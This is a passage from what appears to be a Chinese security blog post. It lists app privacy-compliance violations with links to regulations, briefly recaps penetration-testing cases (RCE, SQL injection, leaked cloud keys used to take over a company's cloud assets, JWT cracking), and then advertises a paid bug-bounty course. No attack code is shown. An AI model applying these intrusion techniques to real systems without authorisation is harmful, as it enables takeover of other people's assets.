![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sz3CUYd77UMAoUfc0e8iaOxnIIRkxJznic35XtPdrIHLd0lGmlh20t4iaw/640?wx_fmt=png&from=appmsg "null")  
### 二、隐私合规漏洞汇总  
1. 一个 app 用户登录需要两个条款，用户协议和隐私政策。  
  
1. 用户对于自己信息的处理，包括查看 删除 注销 投诉等以及政策发布，失效，更新日期等。  
  
1. 隐私政策的描述的情况需要符合 APP 实际情形，比如隐私政策中对于注销，投诉提供的操作方法，需要与 app 内实际操作路径相同。  
  
1. 对于业务开展目标用户为 14 周岁以下的儿童，需要有专门的儿童个人信息保护规则。  
  
1. 举例：不同意隐私政策直接退出 app 算违规 如果有提醒则不算默认勾选同意的正常 算违规隐私政策需要采用“告知-同意”的方式，以明显的方式提醒用户阅读并主动同意隐私  
政策。  
  
1. 比如 APP 首次运行时，主动弹框提  
醒用户查看，用户点击同意后才能开始手机号个人信息和申请权限，弹窗要  
设  
置"同意"和"不同意"两个选项。  
  
1. 在注册登录环节需要再次提醒用户查看，一般会采用勾选框等形式。也要确保用户进入APP 后能随时查看隐私政策，一般要求在四次（包含）以内点击就可以阅读到。所有地方的隐私政策内容需要保持一致。  
  
1. 用户拒绝提供一些不必要的信息不可以直接退出 app(必须有二次提醒才可以退出)  
  
1. 权限索取最小原则，寄快递的地方 app 需要你的定位，如果不仅仅要了你的定位则违规。  
  
1. 拒绝定位不让用功能违规。  
  
1. 有注册就要有注销的功能，没有就是违规。且注销的条件不能多余注册的条件。  
  
1. 注销了 app 没有删除你的数据是不算的。  
  
1. 注册的时候选择国家，台湾和中国是分开的。(不一定)  
  
1. 在 app 使用中，用户拒绝了 app 权限授权，则 app 不能频繁申请权限。不频繁的申请评论应为超过 48 小时再次申请。  
  
1. app 申请适用权限，不告知目的。算违规。  
  
1. app 申请权限时，只有拒绝和始终同意，不算违规。  
  
1. 实名认证也要告知-同意的原则  
  
1. 推送功能是要求有关闭功能点的，没有就违规。  
  
1. 开屏广告，不可诱导用户点击，比如欺骗按钮。  
  
1. 用户投诉的渠道APP 内设置反馈表单，在线客服，智能客服等功能处理用户反馈。  
  
1. 涉及人工处理的，承诺处理实现不超过 15 天。  
  
1. 未成年类  
  
1. 若是网络游戏服务，必须防沉迷，设置充值上限，未成年尽可周五，周六，周日和法定节假日每日 20-21 时向用户提供 1 小时服务。  
  
1. 若是网络文学，网络动漫，网络直播，网络音频服务需要设置青少年模式，提供适合未成年用户浏览的内容。  
  
1. 隐私政策涉及敏感信息的地方未加粗。  
  
### 三、隐私漏洞审核标准相关参考  
- 《中华人民共和国个人信息保护法》  
http://www.cac.gov.cn/2021-08/20/c_1631050028355286.htm  
  
- 《App违法违规收集使用个人信息行为认定方法》  
http://www.cac.gov.cn/2019-12/27/c_1578986455686625.htm?from=groupmessage&isappinstalled=0  
  
- 《工业和信息化部关于开展纵深推进APP侵害用户权益专项整治行动的通知》  
https://www.miit.gov.cn/jgsj/xgj/fwjd/art/2020/art_0b18f16130584615a3c585b931092da6.html  
  
- 《常见类型移动互联网应用程序必要个人信息范围规定》  
http://www.cac.gov.cn/2021-03/22/c_1617990997054277  
.  
htm  
  
- 《工业和信息化部关于进一步提升移动互联网应用服务能力的通知》  
https://www.miit.gov.cn/jgsj/xgj/gzdt/art/2023/art_73991cdf4bb2407c822d475250cd21e7.html  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sbjz5qYBNaKjLkuxbe2OHJvibLL0kXcoEB0LzhibDSLH59Yz9NrJrC4Yg/640?wx_fmt=png&from=appmsg "null")  
## 0x10 总结  
  
这篇文章开始给师傅们演示了下资产收集的过程，从对一个目标站点的信息收集再到对该资产站点的渗透测试，找边缘资产以及可以利用的功能点，从而再往下深入利用。  
  
后面给师傅们分享了几个RCE漏洞的过程，还有之前一个前台SQL注入的案例，包括后面利用JS接口文档，找到对应的阿里云AK/SK泄露，从而云接管几十G的该公司云资产，再利用CF进行root权限接管，还有就是JWT爆破相关导致未授权的漏洞，最后面给师傅们分享下隐私合约的漏洞，我看这方面网上的介绍也是比较少的，所以拿出来给师傅们分享下了！  
  
02  
  
0x2 课程背景  
  
哈咯，各位师傅们好久不见！  
神农安全内部小圈子从  
2024年开始搞起来的，到现在也已经有小一两年了，期间承蒙各位师傅们的  
关注和支持  
💗  
非常感谢大家。  
  
「神农安全」知识星球目前已经  
累计1600+网络安全爱好者的加入，在这个过程中收获到了很多师傅们的  
好评与鼓励  
🎉  
，  
内部小圈子：一个知识星球+内部小圈子交流群+知识库。一直一来价格都没有超过50（都给师傅们发优惠卷），基本上加了小圈子的师傅都会说一句——  
“  
这圈子加的真值啊  
”。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthLEynEQtMibH6uWjBva44EEEkCx8bX12KA8gsZKQlllwGfyAEiaDHqY8g/640?wx_fmt=other&from=appmsg "")  
  
我平常呢也特别的爱  
分享技术文章，特别是每当学习到一个新技术，我都会去详细认真的写一篇对应的博客文章进行发表。  
活跃于先知社区、FreeBuf、奇安信攻防社区、知乎与CSDN等技术社区，id：  
一个想当文人的黑客，累计发表   
500+篇原创技术文章。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthlexDYBvDy8LwERVHKlbb7086Gm5KFIV78taz23NJicAWpDYA9T4svTA/640?wx_fmt=png&from=appmsg "")  
  
发表的公众号文章也从来没有设置过  
付费模式，哪怕一篇文章写个一个星期左右，好几万个字一篇的文章也都向来如此。喜欢看我写文章的师傅们都知道我写的技术博客文章：要有  
实战案例截图+详细知识点汇总，所以这样也是吸引到了很多师傅们观看我的文章，也是一年时间迅速在网络安全的圈子里面发展了自己的  
内部小圈子  
（成绩也不错）  
🎉  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthuCBnAiblIbLjjYJhLFZgib8oP96fkScUILU0mYM4ZxN7m06TWhnYicsEQ/640?wx_fmt=png&from=appmsg "")  
  
后面也是小圈子做大起来了，师傅们也都喜欢看我文章，想让我开课教下思路，所以想着自己花时间做了  
 ✨  
课件和课表，都是纯自己手搓的，大家也可以看下课表的内容，再加上  
课程价格：266（小圈子师傅优惠25=241）25是知识星球续费25/年，相当于送小圈子的师傅一年知识星球的价格。  
  
不是小圈子的师傅们报名成功再送内部小圈子（知识星球）一个，都有对应的  
专属微信群聊  
 ✨  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthM2sjuWQFbmvWv79V058KwI0DswFF9LysewGtULj81Vp5bX9nTEK78A/640?wx_fmt=png&from=appmsg "")  
  
03  
  
0x3 课程特色  
  
课程  
主打真实，  
一线SRC漏洞挖掘师傅是如何学习和挖掘SRC漏洞的，让你真正了解SRC漏洞挖掘，助力在岗人员和大学生的能力提升，掌握新的技能树，为下一次  
跳槽涨薪做好准备。本  
课程内容覆盖企业  
SRC、众测项目挖掘、护网HVV红蓝攻防技巧、CVE、CNVD、EDUSRC等平台通杀案例技巧挖掘方法。  
  
本课程  
适合人群  
（光看不挖啥也不会）  
```
1、想从0转行入行的大学生或自学者
2、想从CTF比赛/Web或SRC进阶到项目实战的选手
3、想参与项目/找工作/提高收入的转型者
```  
  
课程价格：266元  
  
加入小圈子的师傅们  
直接减25元=241元  
，报课成功的师傅们直接免费送内部小圈：一个知识星球+内部小圈子交流群  
```
1、课程价格真心实惠，绝不割韭菜
2、两三百的课程价格让你体会大几千的培训课程内容
3、带着大家从0到1，本人上课坚持手搓课件（实战案例+知识体系）
4、拒绝使用PPT演讲模式（无实操，很枯燥）
```  
  
直播培训教学方式  
  
课程  
一周1-2节课，课程特色涵盖直播多人上麦活跃回答，直播过程中有问题随时解决或私信我。  
拉微信群：一个知识星球内部小圈子交流群+课程培训直播通知群。有项目/工作/护网第一时间内推报课的师傅，  
一对一简历优化，助力在岗人员和大学生的能力提升。  
  
一次报名每期均可永久学习，并且赠送内部「神农安全」知识星球，一对一永久解答、无保留教学！  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
课程均为线上交付，报名成功后  
不支持退款  
  
内部小圈子  
（知识星球+内部小圈子交流群+知识库）  
  
对内部小圈子感兴趣的师傅们也可以看下下面的这个  
跳转链接，里面有对小圈子的详细介绍，报名课程成功的师傅们直接免费送一个（直接点击下面直接可以跳转）。  
  
[强烈推荐一个永久的SRC挖掘、渗透攻防内部知识库](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247501608&idx=1&sn=5eb836122ac222ca9767a7bbc3c4521b&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltth4VWMmSt5ZBYAUuNNGuEjU3tvKRAN0yqMTPSnzKxibReCfiaFGibLxdAYw/640?wx_fmt=png&from=appmsg "")  
  
讲师介绍  
  
id：一个想当文人的黑客  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthqvGuVSjkR43eeaNibf1KbGU4nia5ibXFYpTBFeAbQewTq43IqJHIMhhhg/640?wx_fmt=png&from=appmsg "")  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
04  
  
0x4   
第一期挖洞培训课表内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVMibw6HiaoHUxJgNHUVfqCicbGSauW0QQBjLcC9H4gdOEyW3ZzLjTfyYibqGdaSueO9GDbbyicmckia2Kg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍（报课赠送）**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
10、十个专栏会持续更新~提前续费有优惠，好用不贵很实惠
11、每日内部资料分享，内部圈子资料1000+
12、联系圈主获取：内部漏洞知识库+圈子使用手册+内部圈子交流群
13、VX：routing_love，技术交流+疑问解决
```  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
**知识星球——**  
**神农安全**  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=other&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
渗透测试/安服工程师/驻场面试题目，你值得拥有！！！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=other&from=appmsg "")  
  
  
**神农安全公开交流群**  
  
有需要的师傅们直接扫描文章二维码加入，然后要是后面群聊二维码扫描加入不了的师傅们，直接扫描文章开头的二维码加我（备注加群）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXicMkhQ74GbMtwtq7Nw3M2sC3Uiax8KwBPCDmpFicKQeoJicMNtB9JDFhj4PQ0iaGQm7v84UibR2JUgOMw/640?wx_fmt=jpeg&from=appmsg "")  
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
**往期回顾**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[手把手js逆向断点调试&js逆向前端加密对抗&企业SRC实战分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247495361&idx=1&sn=48283073b325e360823da8dec27a7508&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[浅谈src漏洞挖掘中容易出洞的几种姿势](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247489731&idx=1&sn=c3a5ef01648fad496ecda36b653b6e21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[HVV护网行动 | 分享最近攻防演练HVV漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247488672&idx=1&sn=493bb70011a02eb971ff1b74c733f1d9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[攻防演练｜分享最近一次攻防演练RTSP奇特之旅](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492377&idx=1&sn=a94ad30e30e08bd96e888dad744e9814&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[JS漏洞挖掘｜分享使用FindSomething联动的挖掘思路](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492315&idx=1&sn=88991e98058a277e267a9a79b8518e16&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 从jeecg接口泄露到任意管理员用户接管+SQL注入漏洞](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493292&idx=1&sn=611fd43361089a30e5f7bcda21274b95&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[分享SRC中后台登录处站点的漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247485439&idx=1&sn=3fd7e4cef57edca8e73104f8af38fc05&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[企业SRC支付漏洞&EDUSRC&众测挖掘思路技巧操作分享](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247492839&idx=1&sn=b9781f60580c1da8e2151166f0494ba5&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[渗透测试 ｜ 分享某次项目上的渗透测试漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493495&idx=1&sn=791bebc6faa651cc3c585c2f5f481d21&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】分享云安全浪潮src漏洞挖掘技巧](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494877&idx=1&sn=2d00c0f651fd7375e881be86638e53ce&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[实战SRC挖掘｜微信小程序渗透漏洞复盘](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247494468&idx=1&sn=f0da4b4ff7763cbb83b858fb5a8964f9&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[综合资产测绘 | 手把手带你搞定信息收集](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493749&idx=1&sn=d2e0febcdcf9dcd8aa44be0d43b51936&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/EXTCGqBpVJRSicyOOePGE9sGceAg4JcsCFHMqeE6O6zJJaSXkw6VEiaHibGnD0DzgYpbzhdbaTbsMKhJLte7sOt1g/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
[【宝典】针对若依系统nday的常见各种姿势利用](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247493489&idx=1&sn=d3ef10a1ae3b8c161d7174cb42702fac&scene=21#wechat_redirect)  
  
  
  
